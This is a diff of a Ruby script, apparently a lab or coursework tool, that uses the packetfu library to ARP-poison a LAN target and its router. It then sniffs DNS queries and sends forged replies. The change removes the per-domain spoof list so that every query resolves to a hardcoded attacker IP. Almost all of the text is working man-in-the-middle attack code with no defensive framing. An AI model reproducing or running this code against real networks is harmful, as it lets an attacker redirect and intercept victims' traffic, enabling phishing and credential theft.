@@ -4,33 +4,15 @@ require 'packetfu'
 require 'thread'
 require 'macaddr'
 
-include PacketFu
-
 ### User Defined ###############################
 
 target_ip = '192.168.0.9'
 router_ip = '192.168.0.100'
-$iface = 'em1'
-CONFIG_FILE = 'config.txt'
+$attacker_ip = '192.168.0.8'
+iface = 'em1'
 
 ################################################
 
-# Set up the rules for spoofing
-$spoof_hash = Hash.new
-config = File.open(CONFIG_FILE)
-if(config.nil?)
-  #config_error()
-  exit()
-end
-config.each_line do |line|
-  if(!line.nil? && line != "\n")
-    domain, ip = line.split(' ')
-    $spoof_hash[".*#{domain}"] = ip
-  end
-
-end
-
-puts $spoof_hash
 # Get the mac addresses for all the necessary machines.
 sender_mac = Mac.addr
 `ping -c 1 #{target_ip}`
@@ -75,18 +57,10 @@ def runspoof(arp_packet_target,arp_packet_router)
 end
 
 
-def check_spoof(domainName)
-  $spoof_hash.each_key do |k|
-    if domainName =~ /#{k}/
-      return $spoof_hash[k]
-    end
-  end
-  return nil
-end
+def sendResponse(packet, domainName)
 
-def sendResponse(packet, domainName, spoof_ip)
   # Convert the IP address
-  myIP = spoof_ip.split(".")
+  myIP = $attacker_ip.split(".");
   myIP2 = [myIP[0].to_i, myIP[1].to_i, myIP[2].to_i, myIP[3].to_i].pack('c*')
 
   # Create the UDP packet
@@ -138,7 +112,6 @@ def get_info(packet)
 
   # Run in loop to handle infinite amount of levels
   x = true
-
   while x
 
     # Add the letters to the domain
@@ -150,23 +123,26 @@ def get_info(packet)
     end
 
     # Get the new length for the next level(in hex)
-    #if packet.payload[i] != nil
+    if packet.payload[i] != nil
       len = "0x"+packet.payload[i].unpack('h*')[0].chr
       # Increase counter to skip the length
       i += 1
 
       # Stop when we get a length of 0
       # otherwise add a '.' to the domain and calculate the new length
-
       if len == '0x0'
         x = false
       else
         domain += '.'
         last = i + len.hex
       end
-    #else
-      #x = false
-    #end
+    else
+      x = false
+    end
+
+
+
+
   end
 
   return domain
@@ -174,25 +150,17 @@ end
 
 # Opens up the nic for capture.
 def sniff(iface)
-
+  pp 'Sniffing...'
   cap = Capture.new(:iface => iface, :start => true, :filter => 'udp and port 53', :save => true)
-  puts 'Sniffing...'
   cap.stream.each do |p|
     packet = Packet.parse p
 
     $dnsQuery = packet.payload[2].unpack('h*')[0].chr+packet.payload[3].unpack('h*')[0].chr
 
     if $dnsQuery == '10'
-      puts "Got a DNS!: "
       domain = get_info(packet)
-      puts "Checking the spoof: " + domain
-      spoof_ip = check_spoof(domain)
-      puts "SpoofIP: " + spoof_ip
-      if !spoof_ip.nil?
-        puts "sending response"
-        sendResponse(packet, domain, spoof_ip)
-      end
 
+      sendResponse(packet, domain)
     end
 
   end
@@ -202,12 +170,8 @@ end
 begin
   puts "Starting the ARP poisoning thread..."
   spoof_thread = Thread.new{runspoof(arp_packet_target,arp_packet_router)}
-
-  puts "Starting the sniffing thread..."
-  sniff_thread = Thread.new{sniff($iface)}
   spoof_thread.join
-  sniff_thread.join
-
+  sniff(iface)
     # Catch the interrupt and kill the thread
 rescue Interrupt
   puts "\nARP spoof stopped by interrupt signal."
